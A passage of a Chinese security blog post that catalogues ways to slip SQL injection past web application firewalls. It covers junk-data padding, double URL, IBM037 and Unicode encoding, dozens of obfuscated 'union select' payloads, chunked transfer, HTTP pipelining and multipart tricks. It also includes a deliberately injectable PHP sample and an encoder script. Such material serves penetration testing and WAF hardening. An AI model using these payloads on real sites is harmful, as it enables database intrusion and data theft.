title="脏数据溢出绕过"></a>脏数据溢出绕过</h3><p>在真正的payload前填入大量的脏数据，数据太多超过了waf的检测范围。真正的原理据说是因为这算是一个缓冲区溢出。很多waf是C语言编写的，而C语言本身没有缓冲区保护机制。waf在检测超过其缓冲区长度的payload时就会造成绕过。</p><blockquote><p>id&#x3D;1’ and (select 1)&#x3D;(select 0xA*1000) union select 1,2database()–+</p></blockquote><p>这里的<code>select 0xA*1000</code>指的是对0xA的A重复1000次。</p><h3 id="花括号绕过"><a href="#花括号绕过" class="headerlink" title="花括号绕过"></a>花括号绕过</h3><p>在值的位置加上花括号，左边x的位置上可以输入任意字母开头+数字的组合</p><p><img src="/image-20220329173607017.png" srcset="/img/loading.gif" lazyload alt="image-20220329173607017"></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>利用编码绕过waf的最基本的原理就是waf识别不了请求包中的编码协议，或者说对请求包中的编码处理能力有限，但服务器却可以正确识别并处理</p><h4 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h4><p>一开始会把二次编码注入和二次注入搞混淆，关于二次注入会新开一篇文章讲讲。这里先说二次编码注入绕过waf。首先我们先来看一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 首先是一段转义代码，gpc开启时直接用gpc转义，没开启就用addslashes()转义</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterstr</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">get_magic_quotes_gpc</span>())&#123;<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-comment">// 经过url解码后送入sql语句中执行</span><br><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filterstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM usres WHERE id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查询的语句是：&quot;</span>.<span class="hljs-variable">$sql</span>;<br><span class="hljs-comment">// $result = mysql_query($sql);</span><br><span class="hljs-comment">// $row = mysql_fetch_array($result);</span><br></code></pre></td></tr></table></figure><p>乍一看sql语句是经过转义过的，直接执行应该没什么问题。但是我们注意到这个urldecode()函数。这里借用一张图来解释说明。浏览器在传输get方式提交的参数时，会将参数url编码一次，nginx、apache之类的中间件会将参数解码一次。但是如果浏览器传入的是二次url编码后的数据，waf检测到的是只经过一次url解码后的数据，自然就认为是正常的数据了。</p><p><img src="/8581772-82bf1ed3b14f8a26.png" srcset="/img/loading.gif" lazyload alt="img"></p><p>这里用burp做两次url编码</p><p><img src="/image-20220323161250379.png" srcset="/img/loading.gif" lazyload alt="image-20220323161250379"></p><p>一次编码的查询结果，可以看到单引号是被正常转义的</p><p><img src="/image-20220323161309576.png" srcset="/img/loading.gif" lazyload alt="image-20220323161309576"></p><p>两次编码的查询结果，可以看到二次编码后单引号反而没有被转义，直接可以注入了</p><p><img src="/image-20220323161335933.png" srcset="/img/loading.gif" lazyload alt="image-20220323161335933"></p><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>可以将整个payload做一次url编码，也可以对其中单独的字符做url编码，如N的url编码是%4e，在payload中直接用%4e代替，服务器会自动解码后去查询。</p><p><img src="/image-20220329180531823.png" srcset="/img/loading.gif" lazyload alt="image-20220329180531823"></p><h4 id="ibm037编码"><a href="#ibm037编码" class="headerlink" title="ibm037编码"></a>ibm037编码</h4><p>我们需要在Content-Type上设置编码为ibm037，</p><blockquote><p>Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;ibm037</p></blockquote><p>并且将请求体用ibm037编码。这里放一段ibm037的编码脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>s = <span class="hljs-string">&#x27;id=-1 union select 1,user()-- &#x27;</span><br>ens=urllib.parse.quote(s.encode(<span class="hljs-string">&#x27;ibm037&#x27;</span>))<br><span class="hljs-built_in">print</span>(ens)<br></code></pre></td></tr></table></figure><p><img src="/image-20220329183157363.png" srcset="/img/loading.gif" lazyload alt="image-20220329183157363"></p><p>ibm037的支持情况可以参考以下表格</p><p><img src="/image-20220329182757261.png" srcset="/img/loading.gif" lazyload alt="image-20220329182757261"></p><h4 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h4><p>unicode形式：“\u”或者“%u”加上4位16进制unicode码值</p><p>iis会自动识别这种编码，有些waf不会拦截这种编码</p><p>和url编码一样，可以部分编码，也可以全编码</p><p>部分编码，大写N的unicode编码为\u004e，小写s的unicode编码为\u0073，所以payload为</p><blockquote><p>id&#x3D;-1 u\u004eion \u0073elect 1,2,database()–</p></blockquote><p>全编码：</p><blockquote><p>id&#x3D;-1 union select 1,2,database()–</p><p>\u0069\u0064\u003d\u002d\u0031\u0020\u0075\u006e\u0069\u006f\u006e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0031\u002c\u0032\u002c\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u002d\u002d\u0020</p></blockquote><p>如果请求包为JSON格式，也可以将payloadu全部或部分转为unicode编码来绕过waf，参考<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7159#section-8.2">JSON RFC</a></p><h3 id="union-select绕过"><a href="#union-select绕过" class="headerlink" title="union select绕过"></a>union select绕过</h3><p>waf 会针对union select 进行拦截</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">uNIoN sel&lt;&gt;ect <span class="hljs-comment"># 程序过滤&lt;&gt;为空 脚本处理</span><br>uNi<span class="hljs-regexp">/**/</span>on sele<span class="hljs-regexp">/**/</span>ct <span class="hljs-comment"># 程序过滤/**/为空</span><br>uNIoN <span class="hljs-regexp">/\*!%53eLEct\*/</span> <span class="hljs-comment"># url 编码与内联注释</span><br>uNIoN se%<span class="hljs-number">0</span>blect <span class="hljs-comment"># 使用空格绕过</span><br>uNIoN sele%ct <span class="hljs-comment"># 使用百分号绕过</span><br>uNIoN %<span class="hljs-number">53</span>eLEct <span class="hljs-comment"># 编码绕过</span><br>uNIoN sELecT <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#大小写绕过</span><br>uNIoN all select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># ALL绕过</span><br>uNIoN DISTINCT select <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 去重复DISTINCT 绕过</span><br>null+UNION+SELECT+<span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 加号代替空格绕过</span><br><span class="hljs-regexp">/\*!union\*/</span><span class="hljs-regexp">/\*!select\*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 内联注释绕过</span><br><span class="hljs-regexp">/\*!50000union\*/</span><span class="hljs-regexp">/\*!50000select\*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 内联注释绕过</span><br>uNIoN<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment"># 注释代替空格绕过</span><br><span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!12345UNION SELECT*/</span><span class="hljs-regexp">/**/</span><br><span class="hljs-regexp">/**/</span>UNION<span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!50000SELECT*/</span><span class="hljs-regexp">/**/</span><br>REVERSE(noinu)+REVERSE(tceles)<br><span class="hljs-regexp">/*!%55NiOn*/</span> <span class="hljs-regexp">/*!%53eLEct*/</span><br>%<span class="hljs-number">55</span>nion(%<span class="hljs-number">53</span>elect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)-- -<br>+union+distinct+select+<br>+<span class="hljs-comment">#uNiOn+#sEleCt</span><br>+<span class="hljs-comment">#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="hljs-regexp">/*!%55NiOn*/</span> <span class="hljs-regexp">/*!%53eLEct*/</span><br><span class="hljs-regexp">/*--*/u</span>nion<span class="hljs-regexp">/*--*/</span>select<span class="hljs-regexp">/*--*/</span><br>union (<span class="hljs-regexp">/*!/</span>**<span class="hljs-regexp">/ SeleCT */</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!union*/</span><span class="hljs-regexp">/**/</span><span class="hljs-regexp">/*!select*/</span><span class="hljs-regexp">/**/</span><br>union%<span class="hljs-number">23</span>foo*%<span class="hljs-number">2</span>F*bar%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aselect%<span class="hljs-number">23</span>foo%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A<br>%<span class="hljs-number">2</span>f**%<span class="hljs-number">2</span>funion%<span class="hljs-number">2</span>f**%<span class="hljs-number">2</span>fselect<br></code></pre></td></tr></table></figure><h3 id="其他畸形payload（持续新增）"><a href="#其他畸形payload（持续新增）" class="headerlink" title="其他畸形payload（持续新增）"></a>其他畸形payload（持续新增）</h3><blockquote><p>union select””a1,database(),3</p><p>union select+1,database(),3</p><p>换行+注释绕过关键表名检测，如<code>information_schema.tables</code>：</p><p>information_schema%23%0a.%23%0a.tables</p></blockquote><h3 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h3><p>分块传输本意用于post的数据过大，需要分成好几个chunk来传输。我们可以利用这个特性来分割payload，从而绕过部分waf。在请求的header中加入<code>Transfer-Encoding: chunked</code>之后，就代表这个报文采用了分块编码。每个分块的首行为数据的长度值（十六进制），可以在长度标识处加上分号“;”作为注释。第二行为数据行，将原payload分为若干个分块，在最后一块数据后加上一个0和两个换行符也就是CRLF，表示后面没有其他数据了。</p><p><img src="/image-20220401160737081.png" srcset="/img/loading.gif" lazyload alt="分块传输绕过"></p><p>新增：最近看到c0ny1师傅提出了一种延时分块传输绕过waf的姿势，学习了<a target="_blank" rel="noopener" href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><h3 id="Pipeline绕过"><a href="#Pipeline绕过" class="headerlink" title="Pipeline绕过"></a>Pipeline绕过</h3><p>在http中使用pipeline是为了复用TCP连接从而加速数据传输速度、降低延迟。在http1. 0中，pipeline是默认关闭的，除非客户端在请求的header中使用<code>Connection:Keep-Alive</code>。在http1.1中，默认所有的连接都是持久连接。利用pipeline的特性将payload分成两个包，前一个放sql注入的payload，后一个放正常的数据包，有些waf会只检查最后一个数据包从而造成绕过。其实这个技术的本质就是HTTP请求走私。</p><p><img src="/image-20220405115834684.png" srcset="/img/loading.gif" lazyload alt="Pipeline绕过"></p><p>下面说一下构造pipeline请求的方式：</p><ol><li>在burp中取消勾选“Update Content-Length”</li><li>复制一份数据包，直接跟在第一个数据包的后面</li><li>将第一个数据包的<code>Connection</code>改为<code>Keep-Alive</code></li><li>将第二个数据包的post body改为正常的数据</li><li>最后手动计算一下第二个包的数据长度，设置在Content-Length中，比如我的第二个包的数据<code>uname=1&amp;passwd=1&amp;submit=Submit</code>长度为30，Content-Length就设置为30</li><li>点击Send发送数据包即可</li></ol><p><img src="/image-20220405120150144.png" srcset="/img/loading.gif" lazyload alt="取消勾选“Update Content-Length”"></p><h3 id="multipart-form-data绕过"><a href="#multipart-form-data绕过" class="headerlink" title="multipart&#x2F;form-data绕过"></a>multipart&#x2F;form-data绕过</h3><p>这种方式也称“协议未覆盖绕过”</p><p>http的Content-Type提交表单支持三种类型：</p><ul><li><p>application&#x2F;x-www-form-urlencoded 编码模式 这也是最常见的form表单提交的格式</p></li><li><p>multipart&#x2F;form-data 这种格式多用于文件上传的file控件</p></li><li><p>text&#x2F;plain 文本模式</p></li></ul><p>Content-Type的作用就是告诉服务器提交上来的表单是以什么格式编码的，以便于服务器解码。由于multipart&#x2F;form-data多用于对上传的文件进行编码，所以有些waf不会检查编码后的文件内容，如果我们以这种形式提交post数据，则可以绕过waf。</p><p><img src="/image-20220405145549950.png" srcset="/img/loading.gif" lazyload alt="multipart/form-data绕过"></p><h3 id="组合技绕waf"><a href="#组合技绕waf" class="headerlink" title="组合技绕waf"></a>组合技绕waf</h3><p>通常绕过waf需要将上述的技巧进行组合，比如分块传输+multipart&#x2F;form-data绕过，先进行form-data编码，再进行分块传输编码。</p><p><img src="/image-20220405150006982.png" srcset="/img/loading.gif" lazyload alt="组合技绕waf"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177044">对过WAF的一些认知</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8490">MySQL绕过小结</a></p><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/169738">利用分块传输吊打所有WAF</a></p><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/193659.html">在HTTP协议层面绕过WAF</a></p><p><a target="_blank" rel="noopener" href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/351375005">解密协议层的攻击——HTTP请求走私</a></p><p><a target="_blank" rel="noopener" href="https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/">Bypassing WAFs with JSON Unicode Escape Sequences</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/368">我的WafBypass之道（SQL注入篇）</a></p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a> <span>></span> <a href="/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="print-no-link">#sql注入</a> <a href="/tags/bypass/" class="print-no-link">#bypass</a></div></div><div class="license-box my-3"><div class="license-title"><div>SQL注入绕过</div><div>https://wanf3ng.github.io/2022/03/18/SQL注入绕过/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>wanf3ng</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2022年3月18日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2022/03/23/ToDo_List/" title="ToDo List"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">ToDo List</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/2021/04/20/python%E5%8D%8F%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%99%A8%E5%AE%9E%E7%8E%B0/" title="python协程扫描器实现"><span class="hidden-mobile">python协程扫描器实现</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="valine"></div><script type="text/javascript">Fluid.utils.loadComments("#valine",(function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",(function(){var i=Object.assign({appId:"p02g21Pc8PhKfLm9ib0EkgvU-gzGzoHsz",appKey:"WvjDJdcuEIzre37U5HgmMBRy",path:"window.location.pathname",placeholder:"说点什么",avatar:"retro",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!0,serverURLs:"",emojiCDN:null,emojiMaps:null,enableQQ:!0},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><div style="font-size:.85rem"><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span><script src="/js/duration.js"></script></div></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/custom.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>